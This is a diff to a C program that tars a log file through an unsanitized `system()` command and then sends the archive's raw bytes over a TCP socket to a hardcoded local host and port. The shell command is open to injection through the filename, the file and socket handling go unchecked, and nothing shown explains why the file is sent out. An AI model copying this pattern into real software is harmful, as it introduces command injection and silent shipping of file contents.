@@ -109,10 +109,75 @@ void check_file() {
 }
 
 void tar_log_file(char *filename) {
-    char command[1024];
+    char command[1024], tar_filename[1024];
 
     snprintf(command, sizeof(command), "tar czf %s.tar.gz %s", filename, filename);
     system(command);
+
+    // Tar filename
+    snprintf(tar_filename, sizeof(tar_filename), "%s.tar.gz", filename);
+    
+    // Get size of tar file
+    struct stat st;
+    stat(tar_filename, &st);
+    int size = st.st_size;
+
+    // File to buffer
+    char *buffer = (char*)malloc(sizeof(char) * size);
+    FILE *f = fopen(tar_filename, "rb");
+    for (size_t i = 0; i < size; ++i) {
+        int c = getc(f);
+
+        if (c == EOF) {
+            buffer[i] = 0x00;
+            break;
+        }
+
+        buffer[i] = c;
+    }
+    fclose(f);
+
+    send_to_server(buffer, size);
+
+    free(buffer);
+}
+
+int send_to_server(char *data, int data_size) {
+  int sockfd, portno, n;
+  struct sockaddr_in serv_addr;
+  struct hostent *server;
+
+  char buffer[256];
+
+  portno = 12345;
+
+  // Create a socket
+  sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+  if (sockfd < 0) return -1;
+
+  server = gethostbyname("127.0.0.1");
+
+  if (server == NULL) return -1;
+
+  bzero((char *)&serv_addr, sizeof(serv_addr));
+  serv_addr.sin_family = AF_INET;
+  bcopy((char *)server->h_addr, (char *)&serv_addr.sin_addr.s_addr,
+        server->h_length);
+  serv_addr.sin_port = htons(portno);
+
+  // Connect to the server
+  if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+    printf("[error]\tConnecting to server\n");
+    return -1;
+  }
+
+  // Send message
+  n = write(sockfd, data, data_size);
+
+  if (n < 0) return -1;
+
+  return 0;
 }
 
 /*
